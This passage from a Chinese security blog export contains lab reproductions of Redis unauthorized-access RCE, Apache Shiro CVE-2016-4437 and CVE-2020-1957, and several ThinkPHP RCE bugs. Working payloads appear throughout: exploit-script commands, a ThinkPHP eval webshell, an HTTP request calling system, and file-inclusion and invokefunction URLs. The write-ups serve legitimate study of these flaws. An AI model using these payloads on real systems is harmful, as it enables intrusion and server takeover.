<h3 id="添加背景图片的路径问题"><a href="#添加背景图片的路径问题" class="headerlink" title="添加背景图片的路径问题"></a>添加背景图片的路径问题</h3><p>图片直接放在<em>public</em>下的<em>images</em>文件夹中使用相对路径调用即可</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>redis 4-unacc</title>
    <url>/2021/06/28/redis-4-unacc/</url>
    <content><![CDATA[<h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>攻击者：192.168.229.129</p>
<p>靶机：192.168.229.137</p>
<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>使用docker和docker-compose运行漏洞环境vulhub</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入vulhub中Redis的4-unacc目录</span><br><span class="line">docker-compose build &#x2F;&#x2F;对靶场进行编译</span><br><span class="line">docker-compose up -d &#x2F;&#x2F;运行靶场</span><br><span class="line">docker-compose down &#x2F;&#x2F;移除靶场</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/28/qJgE9XUH8Nwrl4s.png"></p>
<p><img src="https://i.loli.net/2021/06/28/eTB7CAV3FbQmRlt.png" alt="image-20210628210758753"></p>
<h2 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h2><p>攻击者也要安装Redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.12.tar.gz #下载</span><br><span class="line">2.tar -xzf redis-2.8.12.tar.gz #解压</span><br><span class="line">3.cd到redis-2.8.12 目录下</span><br><span class="line">4.输入命令make #安装</span><br><span class="line">5.进入redis-2.8.12&#x2F;src&#x2F;目录下</span><br><span class="line">6.输入命令&#96;.&#x2F;redis-cli -h&#96;，出现帮助内容就表示可以使用了</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/28/8HXJehCYPLgbwRn.png" alt="image-20210628131141013"></p>
<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap可以扫描出靶机6379的Redis服务器</p>
<p><img src="https://i.loli.net/2021/06/28/eJ7SLuprHd4xIWw.png" alt="image-20210628142638144"></p>
<h2 id="Redis直接连接"><a href="#Redis直接连接" class="headerlink" title="Redis直接连接"></a>Redis直接连接</h2><p>可以使用kali中的Redis直接连接<code>./redis-cli -h ip</code></p>
<p>使用<code>info</code>可以查看到一些服务器的敏感信息</p>
<p><img src="https://i.loli.net/2021/06/28/92slmStOpfTcWnA.png" alt="image-20210628142952657"></p>
<h2 id="下载exp到本地"><a href="#下载exp到本地" class="headerlink" title="下载exp到本地"></a>下载exp到本地</h2><p><img src="https://i.loli.net/2021/06/28/unGywmoYF3XRehd.png" alt="image-20210628143941751"></p>
<h2 id="make编译exp"><a href="#make编译exp" class="headerlink" title="make编译exp"></a>make编译exp</h2><p>cd到<code>redis-rogue-server /RedisModulesSDK/exp/</code>目录下，使用make进行编译，该目录下会多出<code>exp.o</code>和<code>exp.so</code>两个文件</p>
<p><img src="https://i.loli.net/2021/06/28/wOQgcMWfEeASXGb.png" alt="image-20210628144722979"></p>
<p><img src="https://i.loli.net/2021/06/28/uC1FEcHXLQidvGM.png" alt="image-20210628144753019"></p>
<p>返回到<code>redis-rogue-server.py</code>目录下</p>
<p><code>./redis-rogue-server.py --rhost  --lhost </code></p>
<p><img src="https://i.loli.net/2021/07/24/Kyfbumq3zYErXdx.png" alt="image-20210724191619236"></p>
<p>然后就卡住了。。</p>
<p>换了个exp</p>
<p><code>git clone https://github.com/vulhub/redis-rogue-getshell.git</code></p>
<p><img src="/2021/06/28/redis-4-unacc/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210628191840574.png" alt="image-20210628191840574"></p>
<p><code>./redis-master.py -r 靶机IP -p 6379 -L 攻击机IP -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
<p><img src="https://i.loli.net/2021/07/24/lNbpzYX9uBOGr8x.png" alt="image-20210724191339232"></p>
<p>然后就又卡住了。。。</p>
<h2 id="在新的靶机上搭建docker"><a href="#在新的靶机上搭建docker" class="headerlink" title="在新的靶机上搭建docker"></a>在新的靶机上搭建docker</h2><p>vps不好用，搭了个本地的环境来演示</p>
<p>结果原来的阿里源不能用了，又折腾了半天换源。。（图中的是中科大的源也还是不行）</p>
<p><img src="https://i.loli.net/2021/06/28/qJRZCSbj37pl6fk.png" alt="image-20210628203059513"></p>
<p>最后也是糊里糊涂添加了一堆源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">#163</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security wheezy&#x2F;updates main non-free contrib</span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br></pre></td></tr></table></figure>
<p>然后就可以了。。。淦</p>
<p>直连成功</p>
<p><img src="https://i.loli.net/2021/06/28/jGkwFEeo6zlWJVa.png" alt="image-20210628204907522"></p>
<p><code>./redis-master.py -r 192.168.229.137 -p 6379 -L 192.168.229.129 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
<p><img src="https://i.loli.net/2021/06/28/xaeSJCN8zQfIvbE.png" alt="image-20210628205215675"></p>
<p>不过是<code>eredis</code>是什么鬼？？？</p>
<p>第一个exp也可以利用</p>
<p><img src="https://i.loli.net/2021/06/28/kE2gR3pcPFxudeh.png" alt="image-20210628210157607"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉自己啥都没做，差太多了，还有</p>
<blockquote>
<p>这里只是使用vulhub漏洞环境，只能通过该exp来getshell，像通过写文件、ssh key或定时计划来getshell,都是不成功的，会提示没有权限</p>
</blockquote>
<p>考完就尝试另外三个方法</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/yiiiing/article/details/108218674">Redis 4.x5.x 未授权访问漏洞EXP复现过程</a></p>
<p><a href="https://blog.csdn.net/roukmanx/article/details/103682318">Redis 4.x/5.x 未授权访问漏洞</a></p>
<p><a href="https://www.cnblogs.com/rnss/p/13612703.html">redis 4-unacc 复现</a></p>
]]></content>
      <categories>
        <category>vulhub</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>redis rce 4.x/5.x 基于主从复制</title>
    <url>/2021/07/24/redis-rce-4-x-5-x-%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
    <content><![CDATA[<h1 id="基于主从复制的rce"><a href="#基于主从复制的rce" class="headerlink" title="基于主从复制的rce"></a>基于主从复制的rce</h1><h2 id="什么是主从复制"><a href="#什么是主从复制" class="headerlink" title="什么是主从复制"></a>什么是主从复制</h2><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而<strong>从机只负责读，主机只负责写</strong>，通过<strong>读写分离</strong>可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p>
<blockquote>
<p>当数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式</p>
</blockquote>
<h2 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h2><p>Redis在4.x以后新增了模块功能，通过外部扩展，可以实现在Redis中实现一个新的Redis命令，通过c并编译出<code>.so</code>文件</p>
<h2 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h2><p>Redis 4.x-Redis 5.x</p>
<p><img src="https://i.loli.net/2021/07/26/kdjrNSR6bivB1fQ.png" alt="image-20210726101726937"></p>
<p><img src="https://i.loli.net/2021/07/25/DItCREc985YXj7J.png" alt="image-20210725211335807"></p>
<p><img src="https://i.loli.net/2021/07/25/pJVHLjYRSyM3h9T.png" alt="image-20210725222651716"></p>
]]></content>
      <tags>
        <tag>Redis rce</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro 反序列化CVE-2016-4437</title>
    <url>/2021/09/09/shiro-CVE-2016-4437/</url>
    <content><![CDATA[<h2 id="shiro-反序列化-CVE-2016-4437"><a href="#shiro-反序列化-CVE-2016-4437" class="headerlink" title="shiro 反序列化 CVE-2016-4437"></a>shiro 反序列化 CVE-2016-4437</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache shiro框架提供了记住我（Remember me）功能，用户登录后会生成经过加密的cookie，cookie中的rememberMe字段会被分别进行序列化，AES加密，base64编码操作，</p>
<p>服务端接收cookie时会进行解密操作，对应加密过程，分别就是</p>
<ul>
<li>获取rememberMe cookie</li>
<li>base64 decode</li>
<li>解密AES（加密密钥硬编码）</li>
<li>反序列化（未做过滤处理）</li>
</ul>
<p>AES加密的密钥key被硬编码在代码里，也就是通过源码就可以获得key，因此攻击者创建一个恶意对象，并对其进行反序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送，shiro将其解密并反序列化，最终造成反序列化漏洞</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://i.loli.net/2021/09/10/N4ITAJwUmPD95Ke.png" alt="image-20210910190008301"></p>
<p>勾选<code>Remember me</code>，抓包</p>
<p>响应包中存在<code>Set-Cookie: rememberMe=deleteMe</code>，可能存在shiro反序列化漏洞</p>
<p><img src="https://i.loli.net/2021/09/10/qXU8wco6FWz4hEQ.png" alt="image-20210910203630433"></p>
<p>利用exp</p>
<p><code>python3 shiro_exploit.py -t 3 -u http://靶机ip:8080 -p &quot;mkdir 111&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali2020:~&#x2F;桌面&#x2F;Shiro_exploit# python3 shiro_exploit.py -t 3 -u http:&#x2F;&#x2F;靶机ip:8080 -p &quot;mkdir 111&quot;</span><br><span class="line">getdomain error:HTTPConnectionPool(host&#x3D;&#39;www.dnslog.cn&#39;, port&#x3D;80): Max retries exceeded with url: &#x2F;getdomain.php?t&#x3D;321601 (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f0dcf93b160&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#39;))</span><br><span class="line">getdomain error</span><br><span class="line">get dns host error</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>大概就是连不到<a href="http://www.dnslog.cn这个网站/">www.dnslog.cn这个网站</a></p>
<blockquote>
<p>利用exp的流程是，先通过创建文件等操作验证exp可用，然后反弹加密shell，最终getshell</p>
<p>详见<a href="https://www.cnblogs.com/renhaoblog/p/12971152.html">Apache Shiro 反序列化漏洞复现（CVE-2016-4437）</a></p>
<p>加密shell网址<a href="http://jackson-t.ca/runtime-exec-payloads.html">http://jackson-t.ca/runtime-exec-payloads.html</a></p>
</blockquote>
<p>换用shiro利用工具</p>
<p><img src="https://i.loli.net/2021/09/11/IH12O3LKoZDaTQf.png" alt="image-20210911171444552"></p>
<p>输入检测目标，进行密钥及利用链爆破，若成功爆破密钥并发现构造链即可进行利用</p>
<p><img src="https://i.loli.net/2021/09/11/vxdLeq65zn2A9ZI.png" alt="image-20210911203333643"></p>
<p>注入内存马</p>
<p><img src="https://i.loli.net/2021/09/16/vsEylobtciMTJCn.png" alt="image-20210916111221994"></p>
<p><img src="https://i.loli.net/2021/09/16/qzMPaulp7w3oTE8.png" alt="image-20210916111136795"></p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul>
<li><p>不使用硬编码，删除默认密钥</p>
</li>
<li><p>升级shiro到1.2.5以上</p>
</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p><a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/loong-hon/p/10619616.html">Apache Shiro Java反序列化漏洞分析</a></p>
<p><a href="https://www.cnblogs.com/renhaoblog/p/12971152.html">Apache Shiro 反序列化漏洞复现（CVE-2016-4437）</a></p>
<p><a href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">Apache Shiro 反序列化漏洞实战</a></p>
]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro权限绕过CVE-2020-1957</title>
    <url>/2021/09/11/shiro-CVE-2020-1957/</url>
    <content><![CDATA[<h2 id="shiro权限绕过CVE-2020-1957"><a href="#shiro权限绕过CVE-2020-1957" class="headerlink" title="shiro权限绕过CVE-2020-1957"></a>shiro权限绕过CVE-2020-1957</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.5.2版本以下</p>
<h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>shiro通过拦截器来实现对用户访问权限的控制和拦截，有anon,authc拦截器</p>
<blockquote>
<p>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口<br>authc为登录拦截器，需要登录认证才能访问的资源</p>
</blockquote>
<p>在shiro.ini编写匹配的url配置，将会拦截匹配的url，并执行响应的拦截器，实现对url的控制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[urls]</span><br><span class="line">&#x2F;index.html &#x3D; anon</span><br><span class="line">&#x2F;user&#x2F;** &#x3D; authc</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如上，访问/index.html时anon拦截器不会进行登录判断，而访问/user/xxx等页面时，authc拦截器会进行登录判断</p>
</blockquote>
<p>url路径表达式通常为ant格式，路径通配符支持 <code>?</code>  <code>*</code> <code>**</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?：匹配一个字符</span><br><span class="line">*：匹配零个或多个字符串</span><br><span class="line">**：匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure>
<p><code>/*</code>可以匹配到<code>/admin</code>，而匹配不到<code>/admin/</code>因为<code>*</code>不能匹配路径</p>
<p>这是如果对/admin设置了authc拦截器，访问该页面会进行登录判断；当请求的/admin/时会因为<code>/*</code>无法正确路径，会放行进入spring(Servlet)拦截器，最终/admin和/admin/访问到的资源是一样的</p>
<p>或者说是spring web匹配url的时候没有匹配上/导致绕过</p>
<p>请求的URL在整个项目的传入传递过程中，在使用了shiro的项目，是我们请求的URL(URL1),进过shiro权限检验(URL2), 最后到springboot项目找到路由来处理(URL3)，漏洞就出现在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL</p>
<p><img src="https://i.loli.net/2021/09/11/Q7F6VoACpR1keaW.png" alt="image-20210911212501781"></p>
<p><img src="https://i.loli.net/2021/09/12/Oc9XgtIHwu5efNp.png" alt="image-20210912171647697"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.riskivy.com/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-2020-1957%EF%BC%89/">Shiro 权限绕过漏洞分析（CVE-2020-1957）</a></p>
<p><a href="https://paper.seebug.org/1196/">Shiro 权限绕过漏洞分析(CVE-2020-1957)</a></p>
<p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">CVE-2020-11989（玄武实验室）</a></p>
]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp 2-rce</title>
    <url>/2021/09/30/thinkphp-2-rce/</url>
    <content><![CDATA[<h2 id="thinkphp-2-rce"><a href="#thinkphp-2-rce" class="headerlink" title="thinkphp 2-rce"></a>thinkphp 2-rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">res = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;</span>\\1\<span class="string">&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span></span><br></pre></td></tr></table></figure>
<p>导致输入的参数被插入双引号中执行，造成任意代码执行漏洞</p>
<p><code>preg_replace(&#39;正则表达&#39;,&#39;替换字符&#39;,&#39;目标字符&#39;)</code></p>
<p>就是如果目标字符中存在符合正则规则的字符，那么就替换为替换字符，而如果此时正则规则中使用了<code>/e</code>这个修饰符，则存在代码执行漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </span><br><span class="line">&#x2F;e 可执行模式，此为PHP专有参数，例如preg_replace函数。</span><br></pre></td></tr></table></figure>
<p>详细分析见<a href="https://www.freebuf.com/column/223149.html">ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行</a></p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>thinkPHP 2.x</p>
<p>thinkphp lite模式下3.0</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>访问8080端口</p>
<p><img src="https://i.loli.net/2021/09/30/yLwKVcpOEkQxjne.png" alt="image-20210930203058925"></p>
<p>payload</p>
<p><code>ip:8080/index.php?s=/index/index/xxx/$&#123;@phpinfo()&#125;</code></p>
<p><img src="https://i.loli.net/2021/10/20/uhLTNQoWy8fqPcI.png" alt="image-20211020195146011"></p>
<p><code>ip:8080/index.php?s=a/b/c/$&#123;@print(eval($_POST[1]))&#125;</code> //一句话连接蚁剑菜刀</p>
<p>回显系统发生错误，但其实已经执行成功</p>
<p><img src="https://i.loli.net/2021/10/20/JT1rYBGeCaLV6ZE.png" alt="image-20211020200702800"></p>
<p>测试一下连接</p>
<p><img src="https://i.loli.net/2021/10/20/hx1ZiKqcoOmXECS.png" alt="image-20211020200340886"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.wangan.com/docs/446">ThinkPHP 2.x 任意代码执行漏洞</a></p>
<p><a href="https://www.cnblogs.com/cute-puli/p/13285528.html">漏洞复现-2.x rce-Thinkphp远程命令执行</a></p>
<p><a href="https://www.cnblogs.com/ingd/p/7222424.html">ThinkPHP 框架2.1，2.2和3.0版本开启lite模式导致URL命令执行漏洞</a></p>
]]></content>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp 5.0.23-rce （核心类 Request rce）</title>
    <url>/2021/10/20/thinkphp-5-0-23-rce/</url>
    <content><![CDATA[<h2 id="thinkphp-5-0-23-rce-（核心类-Request-rce）"><a href="#thinkphp-5-0-23-rce-（核心类-Request-rce）" class="headerlink" title="thinkphp 5.0.23-rce （核心类 Request rce）"></a>thinkphp 5.0.23-rce （核心类 Request rce）</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>获取method的方法中没有正确处理方法名，导致可以调用request类任意方法并构造利用链，导致rce</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0版本（&lt;5.0.24）</p>
<p><img src="https://i.loli.net/2021/10/20/1NKO3R7mIVyxJpj.png" alt="image-20211020203941293"></p>
<h3 id="简单分析复现"><a href="#简单分析复现" class="headerlink" title="简单分析复现"></a>简单分析复现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">@@ -<span class="number">522</span>,<span class="number">8</span> +<span class="number">522</span>,<span class="number">11</span> @@ <span class="function"><span class="keyword">public</span> function <span class="title">method</span><span class="params">($method = <span class="keyword">false</span>)</span></span></span><br><span class="line"><span class="function">            return $<span class="keyword">this</span>-&gt;<span class="title">server</span><span class="params">(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>)</span> ?: &#x27;GET&#x27;</span>;</span><br><span class="line">        &#125; elseif (!$<span class="keyword">this</span>-&gt;method) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isset($_POST[Config::get(<span class="string">&#x27;var_method&#x27;</span>)])) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">&#x27;var_method&#x27;</span>)]);</span><br><span class="line">                $<span class="keyword">this</span>-&gt;&#123;$<span class="keyword">this</span>-&gt;method&#125;($_POST);</span><br><span class="line">                $method = strtoupper($_POST[Config::get(<span class="string">&#x27;var_method&#x27;</span>)]);</span><br><span class="line">                <span class="keyword">if</span> (in_array($method, [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;DELETE&#x27;</span>, <span class="string">&#x27;PUT&#x27;</span>, <span class="string">&#x27;PATCH&#x27;</span>])) &#123;</span><br><span class="line">                    $<span class="keyword">this</span>-&gt;method = $method;</span><br><span class="line">                    $<span class="keyword">this</span>-&gt;&#123;$<span class="keyword">this</span>-&gt;method&#125;($_POST);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; elseif (isset($_SERVER[<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>])) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;method = strtoupper($_SERVER[<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>




<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">&#x27;var_method&#x27;</span>)]);</span><br><span class="line">$<span class="keyword">this</span>-&gt;&#123;$<span class="keyword">this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>




<p><code>var_method</code>常量定义在<code>application/config.php</code>中，<code>var_method</code>对应的值是<code>_method</code></p>
<p>POST方式传入的<code>_method=xxx</code>后，会将xxx转换为大写赋值给<code>$this-&gt;method</code>，然后会调用<code> $this-&gt;&#123;$this-&gt;method&#125;($_POST);</code>即<code> $this-&gt;XXX($_POST);</code>说明在这里调用的函数<code>_$method</code>可控，传入的数据也可控；</p>
<p>也就意味着可以调用<code>Request</code>类的任意方法，而当调用构造方法<code>_construct()</code>时，就可以覆盖<code>Request</code>类的任意成员变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">@@ -<span class="number">792</span>,<span class="number">8</span> +<span class="number">795</span>,<span class="number">8</span> @@ <span class="function"><span class="keyword">public</span> function <span class="title">request</span><span class="params">($name = <span class="string">&#x27;&#x27;</span>, $<span class="keyword">default</span> = <span class="keyword">null</span>, $filter = <span class="string">&#x27;&#x27;</span>)</span></span></span><br><span class="line"><span class="function">            $<span class="keyword">this</span>-&gt;request </span>= $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;param      = [];</span><br><span class="line">            $<span class="keyword">this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;param          = [];</span><br><span class="line">            $<span class="keyword">this</span>-&gt;mergeParam     = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;request = array_merge($<span class="keyword">this</span>-&gt;request, $name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;input($<span class="keyword">this</span>-&gt;request, $name, $<span class="keyword">default</span>, $filter);</span><br></pre></td></tr></table></figure>


<p>详见<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a></p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</span><br><span class="line">Host: ip</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;id</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/10/25/fT67ZVeSCQn9Jcg.png" alt="image-20211025111506856"></p>
<p><img src="https://i.loli.net/2021/10/25/36vksn18SoGtRLi.png" alt="image-20211025111703949"></p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>官方的修复方法是：在ThinkPHP5.0.24中，增加了<strong>对<code>$this-&gt;method</code>的判断</strong>，不允许再自由调用类函数。并且不要开启debug模式，以免遭受攻击</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/252811#h2-10">ThinkPHP V5 漏洞复现</a></p>
<p><a href="https://blog.csdn.net/nicesa/article/details/106247668">ThinkPHP5 5.0.23 远程代码执行漏洞</a></p>
<p><a href="https://www.sohu.com/a/290190100_100014967">漏洞研究|ThinkPHP request函数远程代码执行</a></p>
<p><a href="https://www.codercto.com/a/54587.html">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
<p><a href="https://www.bilibili.com/read/cv10345589">ThinkPHP RCE漏洞分析合集</a></p>
]]></content>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</title>
    <url>/2021/10/25/thinkphp-5-rce/</url>
    <content><![CDATA[<h2 id="ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce"><a href="#ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce"></a>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>因为框架对传入的路由参数过滤不严格，没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以操作非预期的控制器类执行任意方法，从而导致rce</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.5-5.0.22（5.0.x）<br>5.1.0-5.1.30（5.1.x）</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>5.0.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>


<p>5.1.x</p>
